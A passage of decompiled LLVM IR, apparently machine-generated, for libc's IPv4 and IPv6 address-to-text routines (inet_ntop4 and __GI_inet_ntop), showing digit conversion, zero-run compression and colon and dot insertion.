  %v5_8057103 = load i8, i8* %v4_8057103, align 1
  %v11_8057103 = icmp eq i8 %v5_8057103, 48
  store i1 %v11_8057103, i1* %zf.global-to-local, align 1
  %v1_8057108 = icmp eq i1 %v11_8057103, false
  %v0_8057132 = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_8057108, label %dec_label_pc_8057130, label %dec_label_pc_805710a

dec_label_pc_805710a:                             ; preds = %dec_label_pc_80570e0
  %v3_805710e = trunc i32 %v0_8057132 to i16
  %v5_805710e = udiv i16 %v3_805710e, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_805710e, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_8057120 = trunc i16 %tmp42 to i8
  %v2_8057120 = or i8 %v1_8057120, 48
  %v12_8057120 = zext i8 %v2_8057120 to i32
  store i32 %v12_8057120, i32* %eax.global-to-local, align 4
  %v7_8057122 = icmp eq i8 %v1_8057120, 0
  store i1 %v7_8057122, i1* %zf.global-to-local, align 1
  store i8 %v2_8057120, i8* %v4_8057103, align 1
  %v0_8057128 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8057128, label %dec_label_pc_8057153, label %dec_label_pc_805712a

dec_label_pc_805712a:                             ; preds = %dec_label_pc_805710a
  store i32 %v1_80570fa, i32* @ecx, align 4
  br label %dec_label_pc_8057153

dec_label_pc_8057130:                             ; preds = %dec_label_pc_80570e0
  store i32 %v1_80570fa, i32* %ebx.global-to-local, align 4
  %v3_8057138 = trunc i32 %v0_8057132 to i16
  %v5_8057138 = udiv i16 %v3_8057138, 10
  %tmp43 = urem i16 %v5_8057138, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_8057148 = add i32 %v0_80570fa, 2
  store i32 %v1_8057148, i32* @ecx, align 4
  %v1_805714d = trunc i16 %tmp44 to i8
  %v2_805714d = or i8 %v1_805714d, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_805714d = zext i8 %v2_805714d to i32
  store i32 %v12_805714d, i32* %eax.global-to-local, align 4
  %v4_805714f = add i32 %v0_80570fa, 44
  %v5_805714f = add i32 %v4_805714f, %v0_8057103
  %v6_805714f = inttoptr i32 %v5_805714f to i8*
  store i8 %v2_805714d, i8* %v6_805714f, align 1
  br label %dec_label_pc_8057153

dec_label_pc_8057153:                             ; preds = %dec_label_pc_805710a, %dec_label_pc_805712a, %dec_label_pc_8057130
  %v0_8057153 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8057153 = inttoptr i32 %v0_8057153 to i8*
  %v2_8057153 = load i8, i8* %v1_8057153, align 1
  %v3_8057153 = zext i8 %v2_8057153 to i32
  store i32 %v3_8057153, i32* %eax.global-to-local, align 4
  %v0_805715c = load i32, i32* @esi, align 4
  %v1_805715c = add i32 %v0_805715c, 1
  store i32 %v1_805715c, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8057161 = load i32, i32* @esp, align 4
  %v1_8057161 = load i32, i32* @ecx, align 4
  %v2_8057161 = add i32 %v0_8057161, 44
  %v3_8057161 = add i32 %v2_8057161, %v1_8057161
  %v4_8057161 = inttoptr i32 %v3_8057161 to i8*
  store i8 46, i8* %v4_8057161, align 1
  %v0_8057166 = load i32, i32* @ecx, align 4
  %v1_8057166 = add i32 %v0_8057166, 2
  store i32 %v1_8057166, i32* %edi.global-to-local, align 4
  %v0_8057169 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057169 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057169 = zext i32 %v1_8057169 to i64
  %v3_8057169 = load i32, i32* %edx.global-to-local, align 4
  %v4_8057169 = zext i32 %v3_8057169 to i64
  %v5_8057169 = mul nuw i64 %v4_8057169, 4294967296
  %v6_8057169 = or i64 %v5_8057169, %v2_8057169
  %v7_8057169 = zext i32 %v0_8057169 to i64
  %v8_8057169 = udiv i64 %v6_8057169, %v7_8057169
  %v9_8057169 = trunc i64 %v8_8057169 to i32
  %v10_8057169 = urem i64 %v6_8057169, %v7_8057169
  %v11_8057169 = trunc i64 %v10_8057169 to i32
  store i32 %v11_8057169, i32* @edx, align 4
  %v3_805716b = and i32 %v9_8057169, -256
  %v1_805716d = trunc i64 %v10_8057169 to i8
  %v2_805716d = add i8 %v1_805716d, 48
  %v12_805716d = zext i8 %v2_805716d to i32
  %v15_805716d = or i32 %v12_805716d, %v3_805716b
  store i32 %v15_805716d, i32* %eax.global-to-local, align 4
  %v2_805716f = load i32, i32* @esp, align 4
  %v4_805716f = add i32 %v0_8057166, 43
  %v5_805716f = add i32 %v4_805716f, %v2_805716f
  %v6_805716f = inttoptr i32 %v5_805716f to i8*
  store i8 %v2_805716d, i8* %v6_805716f, align 1
  %v0_8057173 = load i32, i32* @esi, align 4
  %v10_8057173 = icmp eq i32 %v0_8057173, 3
  store i1 %v10_8057173, i1* %zf.global-to-local, align 1
  %v7_8057176 = icmp sgt i32 %v0_8057173, 3
  %v1_805717c.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_8057176, label %dec_label_pc_805717c, label %dec_label_pc_80570e0

dec_label_pc_805717c:                             ; preds = %dec_label_pc_8057153, %entry
  %v1_805717c = phi i32 [ 0, %entry ], [ %v1_805717c.pre, %dec_label_pc_8057153 ]
  %v0_805717c = load i32, i32* @esp, align 4
  %v2_805717c = add i32 %v0_805717c, 42
  %v3_805717c = add i32 %v2_805717c, %v1_805717c
  %v4_805717c = inttoptr i32 %v3_805717c to i8*
  store i8 0, i8* %v4_805717c, align 1
  %v0_8057181 = load i32, i32* @esp, align 4
  %v9_8057181 = icmp eq i32 %v0_8057181, 12
  store i1 %v9_8057181, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_8057189 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_8057189, i32* @eax, align 4
  %v15_8057191 = icmp eq i32 %v3_8057189, %v0_80570c8
  store i1 %v15_8057191, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_8057189, %v0_80570c8
  br i1 %tmp45, label %dec_label_pc_8057197, label %dec_label_pc_80571a6

dec_label_pc_8057197:                             ; preds = %dec_label_pc_805717c
  %v0_8057197 = load i8*, i8** %stack_var_-92, align 4
  %v1_8057197 = ptrtoint i8* %v0_8057197 to i32
  %v2_8057197 = call i32 @__errno_location(i32 %v1_8057197)
  %v1_805719c = inttoptr i32 %v2_8057197 to i32*
  store i32 28, i32* %v1_805719c, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80571b5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80571b5

dec_label_pc_80571a6:                             ; preds = %dec_label_pc_805717c
  %v2_8057184 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_80571a94 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_80571a94, i32* %tmp29, align 4
  %v0_80571ad.cast = inttoptr i32 %v3_80571a94 to i8*
  %v4_80571ad = call i32 @strcpy(i8* %v0_80571ad.cast, i32 %v2_8057184)
  store i32 %v4_80571ad, i32* %eax.global-to-local, align 4
  %v0_80571b2 = load i32, i32* @esp, align 4
  %v6_80571b2 = icmp eq i32 %v0_80571b2, -16
  store i1 %v6_80571b2, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80571b5

dec_label_pc_80571b5:                             ; preds = %dec_label_pc_8057197, %dec_label_pc_80571a6
  %v0_80571bc = phi i32 [ 0, %dec_label_pc_8057197 ], [ %v4_80571ad, %dec_label_pc_80571a6 ]
  %v0_80571b5 = phi i32 [ %v0_80571b5.pre, %dec_label_pc_8057197 ], [ %v15_80570b2, %dec_label_pc_80571a6 ]
  %v9_80571b5 = icmp eq i32 %v0_80571b5, -60
  store i1 %v9_80571b5, i1* %zf.global-to-local, align 1
  store i32 %v0_80570ae, i32* @esi, align 4
  store i32 %v0_80570ad, i32* @edi, align 4
  ret i32 %v0_80571bc

; uselistorder directives
  uselistorder i32 %v0_8057173, { 2, 0, 1 }
  uselistorder i8 %v2_805714d, { 1, 0 }
  uselistorder i32 %v0_8057132, { 1, 0 }
  uselistorder i1 %v11_8057103, { 1, 0 }
  uselistorder i32 %v1_80570fa, { 1, 0 }
  uselistorder i32 %v5_80570e8, { 1, 0 }
  uselistorder i32 %v0_805717330, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 23, 24, 25, 14, 16, 17, 13, 15, 8, 18, 12, 19, 20, 21, 22, 26, 36, 37, 9, 31, 27, 10, 28, 29, 30, 32, 33, 11, 34, 35, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 3, 4, 5, 1, 2, 0 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 3, 5, 4, 6, 14 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder i1* @df, { 5, 34, 35, 0, 1, 36, 37, 38, 43, 2, 3, 26, 4, 48, 49, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 39, 40, 41, 42, 44, 45, 46, 47 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80571b5, { 1, 0 }
  uselistorder label %dec_label_pc_8057153, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80571be = load i32, i32* @edi, align 4
  %v0_80571bf = load i32, i32* @esi, align 4
  %v0_80571c0 = load i32, i32* @ebx, align 4
  %v15_80571c1 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80571c8 = icmp eq i32 %arg1, 2
  br i1 %v9_80571c8, label %dec_label_pc_80571d8, label %dec_label_pc_80571cd

dec_label_pc_80571cd:                             ; preds = %entry
  %v9_80571cd = icmp eq i32 %arg1, 10
  %v1_80571d0 = icmp eq i1 %v9_80571cd, false
  br i1 %v1_80571d0, label %dec_label_pc_8057377, label %dec_label_pc_80571f0

dec_label_pc_80571d8:                             ; preds = %entry
  %v4_80571d8 = ptrtoint i8* %arg3 to i32
  store i32 %v4_80571d8, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_80571e4 = call i32 @inet_ntop4(i32 %v0_80571c0, i32 %v0_80571bf, i32 %v0_80571be)
  store i32 %v3_80571e4, i32* %eax.global-to-local, align 4
  store i32 %v3_80571e4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057384

dec_label_pc_80571f0:                             ; preds = %dec_label_pc_80571cd
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_80571f5 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80571f5, i32* %eax.global-to-local, align 4
  %tmp44 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp44, i8** %stack_var_-124, align 4
  %v6_80571fa = call i32 @__GI_memset(i8* %tmp44, i32 0, i32 32)
  store i32 %v6_80571fa, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_805721c = add i32 %arg2, 1
  br label %dec_label_pc_8057206

dec_label_pc_8057206:                             ; preds = %dec_label_pc_8057206.dec_label_pc_8057206_crit_edge, %dec_label_pc_80571f0
  %v1_8057229 = phi i32 [ %v15_80571c1, %dec_label_pc_80571f0 ], [ %v1_8057229.pre, %dec_label_pc_8057206.dec_label_pc_8057206_crit_edge ]
  %v0_805722171 = phi i32 [ 0, %dec_label_pc_80571f0 ], [ %v0_805722d.pre, %dec_label_pc_8057206.dec_label_pc_8057206_crit_edge ]
  %v1_805720f = ashr i32 %v0_805722171, 31
  %v2_8057210 = zext i32 %v0_805722171 to i64
  %v4_8057210 = zext i32 %v1_805720f to i64
  %v5_8057210 = mul nuw i64 %v4_8057210, 4294967296
  %v6_8057210 = or i64 %v5_8057210, %v2_8057210
  %v8_8057210 = sdiv i64 %v6_8057210, 2
  %v9_8057210 = trunc i64 %v8_8057210 to i32
  store i32 %v9_8057210, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8057210, i32* %ebx.global-to-local, align 4
  %v2_8057218 = add i32 %v0_805722171, %arg2
  %v3_8057218 = inttoptr i32 %v2_8057218 to i8*
  %v4_8057218 = load i8, i8* %v3_8057218, align 1
  %v5_8057218 = zext i8 %v4_8057218 to i32
  store i32 %v5_8057218, i32* %eax.global-to-local, align 4
  %v3_805721c = add i32 %v2_805721c, %v0_805722171
  %v4_805721c = inttoptr i32 %v3_805721c to i8*
  %v5_805721c = load i8, i8* %v4_805721c, align 1
  %v6_805721c = zext i8 %v5_805721c to i32
  store i32 %v6_805721c, i32* %edx.global-to-local, align 4
  %v1_8057221 = add i32 %v0_805722171, 2
  store i32 %v1_8057221, i32* %ecx.global-to-local, align 4
  %v2_8057224 = mul nuw nsw i32 %v5_8057218, 256
  %v2_8057227 = or i32 %v6_805721c, %v2_8057224
  store i32 %v2_8057227, i32* %eax.global-to-local, align 4
  %v3_8057229 = mul i32 %v9_8057210, 4
  %v4_8057229 = add i32 %v3_8057229, 60
  %v5_8057229 = add i32 %v4_8057229, %v1_8057229
  %v6_8057229 = inttoptr i32 %v5_8057229 to i32*
  store i32 %v2_8057227, i32* %v6_8057229, align 4
  %v0_805722d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8057230 = icmp sgt i32 %v0_805722d.pre, 15
  br i1 %v7_8057230, label %dec_label_pc_8057232, label %dec_label_pc_8057206.dec_label_pc_8057206_crit_edge

dec_label_pc_8057206.dec_label_pc_8057206_crit_edge: ; preds = %dec_label_pc_8057206
  %v1_8057229.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057206

dec_label_pc_8057232:                             ; preds = %dec_label_pc_8057206
  %v4_80571f0 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805723c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805723c

dec_label_pc_805723c:                             ; preds = %dec_label_pc_8057232, %dec_label_pc_8057269
  %v0_805726970 = phi i32 [ 0, %dec_label_pc_8057232 ], [ %v1_8057269, %dec_label_pc_8057269 ]
  %v0_805725469 = phi i32 [ -1, %dec_label_pc_8057232 ], [ %v0_80572549, %dec_label_pc_8057269 ]
  %v0_805727468 = phi i32 [ -1, %dec_label_pc_8057232 ], [ %v0_805725910, %dec_label_pc_8057269 ]
  %v0_805727f67 = phi i32 [ -1, %dec_label_pc_8057232 ], [ %v0_805726414, %dec_label_pc_8057269 ]
  %v2_805723c = mul nuw nsw i32 %v0_805726970, 4
  %v3_805723c = add nuw nsw i32 %v2_805723c, 60
  %v4_805723c = add i32 %v3_805723c, %v0_805723c.pre
  %v5_805723c = inttoptr i32 %v4_805723c to i32*
  %v6_805723c = load i32, i32* %v5_805723c, align 4
  %v7_805723c = icmp eq i32 %v6_805723c, 0
  %v1_8057241 = icmp eq i1 %v7_805723c, false
  %v10_8057254 = icmp eq i32 %v0_805725469, -1
  br i1 %v1_8057241, label %dec_label_pc_8057254, label %dec_label_pc_8057243

dec_label_pc_8057243:                             ; preds = %dec_label_pc_805723c
  %v1_8057246 = icmp eq i1 %v10_8057254, false
  br i1 %v1_8057246, label %dec_label_pc_8057251, label %dec_label_pc_8057248

dec_label_pc_8057248:                             ; preds = %dec_label_pc_8057243
  store i32 %v0_805726970, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057269

dec_label_pc_8057251:                             ; preds = %dec_label_pc_8057243
  %v0_8057251 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057251 = add i32 %v0_8057251, 1
  store i32 %v1_8057251, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057269

dec_label_pc_8057254:                             ; preds = %dec_label_pc_805723c
  br i1 %v10_8057254, label %dec_label_pc_8057269, label %dec_label_pc_8057259

dec_label_pc_8057259:                             ; preds = %dec_label_pc_8057254
  %v10_8057259 = icmp eq i32 %v0_805727468, -1
  %v0_8057262.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805725e = load i32, i32* @ebp, align 4
  %v7_8057260 = icmp sgt i32 %v0_8057262.pre, %v1_805725e
  %or.cond = or i1 %v10_8057259, %v7_8057260
  br i1 %or.cond, label %dec_label_pc_8057262, label %dec_label_pc_8057266

dec_label_pc_8057262:                             ; preds = %dec_label_pc_8057259
  store i32 %v0_8057262.pre, i32* @ebp, align 4
  store i32 %v0_805727f67, i32* @edi, align 4
  br label %dec_label_pc_8057266

dec_label_pc_8057266:                             ; preds = %dec_label_pc_8057259, %dec_label_pc_8057262
  %v0_805725912 = phi i32 [ %v0_805727f67, %dec_label_pc_8057262 ], [ %v0_805727468, %dec_label_pc_8057259 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057269

dec_label_pc_8057269:                             ; preds = %dec_label_pc_8057254, %dec_label_pc_8057251, %dec_label_pc_8057248, %dec_label_pc_8057266
  %v0_805726414 = phi i32 [ %v0_805727f67, %dec_label_pc_8057254 ], [ %v0_805727f67, %dec_label_pc_8057251 ], [ %v0_805726970, %dec_label_pc_8057248 ], [ -1, %dec_label_pc_8057266 ]
  %v0_80572549 = phi i32 [ -1, %dec_label_pc_8057254 ], [ %v0_805725469, %dec_label_pc_8057251 ], [ %v0_805726970, %dec_label_pc_8057248 ], [ -1, %dec_label_pc_8057266 ]
  %v0_805725910 = phi i32 [ %v0_805727468, %dec_label_pc_8057254 ], [ %v0_805727468, %dec_label_pc_8057251 ], [ %v0_805727468, %dec_label_pc_8057248 ], [ %v0_805725912, %dec_label_pc_8057266 ]
  %v1_8057269 = add nuw nsw i32 %v0_805726970, 1
  store i32 %v1_8057269, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8057269, 8
  br i1 %exitcond, label %dec_label_pc_805726f, label %dec_label_pc_805723c

dec_label_pc_805726f:                             ; preds = %dec_label_pc_8057269
  %v10_805726f = icmp eq i32 %v0_805726414, -1
  br i1 %v10_805726f, label %dec_label_pc_8057281, label %dec_label_pc_8057274

dec_label_pc_8057274:                             ; preds = %dec_label_pc_805726f
  %v10_8057274 = icmp eq i32 %v0_805725910, -1
  %v0_805727d.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8057274, label %dec_label_pc_805727d, label %dec_label_pc_8057279

dec_label_pc_8057279:                             ; preds = %dec_label_pc_8057274
  %v1_8057279 = load i32, i32* @ebp, align 4
  %v7_805727b = icmp sgt i32 %v0_805727d.pre, %v1_8057279
  br i1 %v7_805727b, label %dec_label_pc_805727d, label %dec_label_pc_8057281

dec_label_pc_805727d:                             ; preds = %dec_label_pc_8057274, %dec_label_pc_8057279
  store i32 %v0_805727d.pre, i32* @ebp, align 4
  store i32 %v0_805726414, i32* @edi, align 4
  br label %dec_label_pc_8057281

dec_label_pc_8057281:                             ; preds = %dec_label_pc_8057279, %dec_label_pc_805726f, %dec_label_pc_805727d
  %v5_805728e = phi i32 [ %v0_805725910, %dec_label_pc_8057279 ], [ %v0_805725910, %dec_label_pc_805726f ], [ %v0_805726414, %dec_label_pc_805727d ]
  %v10_8057281 = icmp eq i32 %v5_805728e, -1
  br i1 %v10_8057281, label %dec_label_pc_8057291, label %dec_label_pc_8057286

dec_label_pc_8057286:                             ; preds = %dec_label_pc_8057281
  %v0_8057286 = load i32, i32* @ebp, align 4
  %v1_8057286 = add i32 %v0_8057286, -1
  %v6_8057286 = sub i32 0, %v0_8057286
  %v7_8057286 = and i32 %v0_8057286, %v6_8057286
  %v8_8057286 = icmp slt i32 %v7_8057286, 0
  %v9_8057286 = icmp eq i32 %v1_8057286, 0
  %v10_8057286 = icmp slt i32 %v1_8057286, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_805728e = icmp ne i1 %v10_8057286, %v8_8057286
  %v4_805728e = or i1 %v9_8057286, %v3_805728e
  %v7_805728e = select i1 %v4_805728e, i32 -1, i32 %v5_805728e
  store i32 %v7_805728e, i32* @edi, align 4
  br label %dec_label_pc_8057291

dec_label_pc_8057291:                             ; preds = %dec_label_pc_8057281, %dec_label_pc_8057286
  %v0_805733119 = phi i32 [ %v5_805728e, %dec_label_pc_8057281 ], [ %v7_805728e, %dec_label_pc_8057286 ]
  %v2_8057291 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8057291, i32* @ebx, align 4
  %v3_8057313 = add i32 %v4_80571f0, 64
  %v12_80572d1 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805733159 = icmp eq i32 %v0_805733119, -1
  %v1_80572d9 = icmp eq i1 %v12_80572d1, false
  br label %dec_label_pc_805729c

dec_label_pc_805729c:                             ; preds = %dec_label_pc_8057291, %dec_label_pc_8057327
  %v10_805733166 = phi i1 [ %v10_805733159, %dec_label_pc_8057291 ], [ %v10_8057331, %dec_label_pc_8057327 ]
  %v0_80572b665 = phi i32 [ 0, %dec_label_pc_8057291 ], [ %v1_8057327, %dec_label_pc_8057327 ]
  %v1_80572ac64 = phi i32 [ %v0_805733119, %dec_label_pc_8057291 ], [ %v0_8057331.pre, %dec_label_pc_8057327 ]
  %v0_80572ba63 = phi i32 [ %v2_8057291, %dec_label_pc_8057291 ], [ %v0_80572b020, %dec_label_pc_8057327 ]
  %stack_var_-120.162 = phi i8* [ null, %dec_label_pc_8057291 ], [ %stack_var_-120.0, %dec_label_pc_8057327 ]
  %stack_var_-116.161 = phi i32 [ 32, %dec_label_pc_8057291 ], [ %stack_var_-116.0, %dec_label_pc_8057327 ]
  br i1 %v10_805733166, label %dec_label_pc_80572b6, label %dec_label_pc_80572a1

dec_label_pc_80572a1:                             ; preds = %dec_label_pc_805729c
  %v2_80572a1 = sub i32 %v0_80572b665, %v1_80572ac64
  %v8_80572a1 = xor i32 %v0_80572b665, %v1_80572ac64
  %v9_80572a1 = xor i32 %v2_80572a1, %v0_80572b665
  %v10_80572a1 = and i32 %v9_80572a1, %v8_80572a1
  %v11_80572a1 = icmp slt i32 %v10_80572a1, 0
  %v12_80572a1 = icmp eq i32 %v2_80572a1, 0
  %v13_80572a1 = icmp slt i32 %v2_80572a1, 0
  %v2_80572a3 = icmp eq i1 %v13_80572a1, %v11_80572a1
  br i1 %v2_80572a3, label %dec_label_pc_80572a5, label %dec_label_pc_80572b6

dec_label_pc_80572a5:                             ; preds = %dec_label_pc_80572a1
  %v1_80572a5 = load i32, i32* @ebp, align 4
  %v2_80572a5 = add i32 %v1_80572a5, %v1_80572ac64
  store i32 %v2_80572a5, i32* %eax.global-to-local, align 4
  %v2_80572a8 = sub i32 %v0_80572b665, %v2_80572a5
  %v8_80572a8 = xor i32 %v2_80572a5, %v0_80572b665
  %v9_80572a8 = xor i32 %v2_80572a8, %v0_80572b665
  %v10_80572a8 = and i32 %v9_80572a8, %v8_80572a8
  %v11_80572a8 = icmp slt i32 %v10_80572a8, 0
  %v13_80572a8 = icmp slt i32 %v2_80572a8, 0
  %v2_80572aa = icmp eq i1 %v13_80572a8, %v11_80572a8
  br i1 %v2_80572aa, label %dec_label_pc_80572b6, label %dec_label_pc_80572ac

dec_label_pc_80572ac:                             ; preds = %dec_label_pc_80572a5
  %v1_80572ae = icmp eq i1 %v12_80572a1, false
  br i1 %v1_80572ae, label %dec_label_pc_8057327, label %dec_label_pc_80572b0

dec_label_pc_80572b0:                             ; preds = %dec_label_pc_80572ac
  %v1_80572b0 = inttoptr i32 %v0_80572ba63 to i8*
  store i8 58, i8* %v1_80572b0, align 1
  %v0_80572b3 = load i32, i32* @ebx, align 4
  %v1_80572b3 = add i32 %v0_80572b3, 1
  store i32 %v1_80572b3, i32* @ebx, align 4
  br label %dec_label_pc_8057327

dec_label_pc_80572b6:                             ; preds = %dec_label_pc_80572a1, %dec_label_pc_80572a5, %dec_label_pc_805729c
  %v1_80572b6 = icmp eq i32 %v0_80572b665, 0
  br i1 %v1_80572b6, label %dec_label_pc_80572be, label %dec_label_pc_80572ba

dec_label_pc_80572ba:                             ; preds = %dec_label_pc_80572b6
  %v1_80572ba = inttoptr i32 %v0_80572ba63 to i8*
  store i8 58, i8* %v1_80572ba, align 1
  %v0_80572bd = load i32, i32* @ebx, align 4
  %v1_80572bd = add i32 %v0_80572bd, 1
  store i32 %v1_80572bd, i32* @ebx, align 4
  %v0_80572be.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80572be

dec_label_pc_80572be:                             ; preds = %dec_label_pc_80572b6, %dec_label_pc_80572ba
  %v0_805731c = phi i32 [ %v0_80572ba63, %dec_label_pc_80572b6 ], [ %v1_80572bd, %dec_label_pc_80572ba ]
  %v1_8057313 = phi i32 [ 0, %dec_label_pc_80572b6 ], [ %v0_80572be.pre, %dec_label_pc_80572ba ]
  %v9_80572be = icmp eq i32 %v1_8057313, 6
  %v1_80572c1 = icmp eq i1 %v9_80572be, false
  br i1 %v1_80572c1, label %dec_label_pc_8057312, label %dec_label_pc_80572c3

dec_label_pc_80572c3:                             ; preds = %dec_label_pc_80572be
  %v0_80572c3 = load i32, i32* @edi, align 4
  %v1_80572c3 = icmp eq i32 %v0_80572c3, 0
  %v1_80572c5 = icmp eq i1 %v1_80572c3, false
  br i1 %v1_80572c5, label %dec_label_pc_8057312, label %dec_label_pc_80572c7

dec_label_pc_80572c7:                             ; preds = %dec_label_pc_80572c3
  %v0_80572c7 = load i32, i32* @ebp, align 4
  %v9_80572c7 = icmp eq i32 %v0_80572c7, 6
  br i1 %v9_80572c7, label %dec_label_pc_80572db, label %dec_label_pc_80572cc

dec_label_pc_80572cc:                             ; preds = %dec_label_pc_80572c7
  %v9_80572cc = icmp eq i32 %v0_80572c7, 5
  %v1_80572cf = icmp eq i1 %v9_80572cc, false
  br i1 %v1_80572cf, label %dec_label_pc_8057312, label %dec_label_pc_80572d1

dec_label_pc_80572d1:                             ; preds = %dec_label_pc_80572cc
  br i1 %v1_80572d9, label %dec_label_pc_8057312, label %dec_label_pc_80572db

dec_label_pc_80572db:                             ; preds = %dec_label_pc_80572d1, %dec_label_pc_80572c7
  %v2_80572e1 = sub i32 %v0_805731c, %v2_8057291
  store i32 %v2_80572e1, i32* @esi, align 4
  %v2_80572ec = sub i32 46, %v2_80572e1
  store i32 %v2_80572ec, i32* @ecx, align 4
  store i32 %v0_805731c, i32* @edx, align 4
  %v1_80572f0 = add i32 %arg2, 12
  store i32 %v1_80572f0, i32* @eax, align 4
  %v0_80572f3 = load i8*, i8** %stack_var_-124, align 4
  %v1_80572f3 = ptrtoint i8* %v0_80572f3 to i32
  %v3_80572f3 = ptrtoint i8* %stack_var_-120.162 to i32
  %v5_80572f3 = call i32 @inet_ntop4(i32 %v1_80572f3, i32 %v3_80572f3, i32 %stack_var_-116.161)
  store i32 %v5_80572f3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80572fa = icmp eq i32 %v5_80572f3, 0
  br i1 %v1_80572fa, label %dec_label_pc_8057384, label %dec_label_pc_8057302

dec_label_pc_8057302:                             ; preds = %dec_label_pc_80572db
  %v0_8057305 = load i32, i32* @ebx, align 4
  %v5_8057305 = inttoptr i32 %v0_8057305 to i8*
  store i8* %v5_8057305, i8** %stack_var_-124, align 4
  %v3_8057306 = call i32 @strlen(i8* %v5_8057305)
  store i32 %v3_8057306, i32* %eax.global-to-local, align 4
  %v0_805730e = load i32, i32* @ebx, align 4
  %v3_805730e = add i32 %v0_805730e, %v3_8057306
  store i32 %v3_805730e, i32* @ebx, align 4
  %v0_8057336.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057336

dec_label_pc_8057312:                             ; preds = %dec_label_pc_80572d1, %dec_label_pc_80572cc, %dec_label_pc_80572c3, %dec_label_pc_80572be
  %v0_8057312 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8057312, i32* %stack_var_-112, align 4
  %v2_8057313 = mul i32 %v1_8057313, 4
  %v4_8057313 = add i32 %v3_8057313, %v2_8057313
  %v5_8057313 = inttoptr i32 %v4_8057313 to i32*
  %v6_8057313 = load i32, i32* %v5_8057313, align 4
  %v5_805731c = inttoptr i32 %v0_805731c to i8*
  store i8* %v5_805731c, i8** %stack_var_-124, align 4
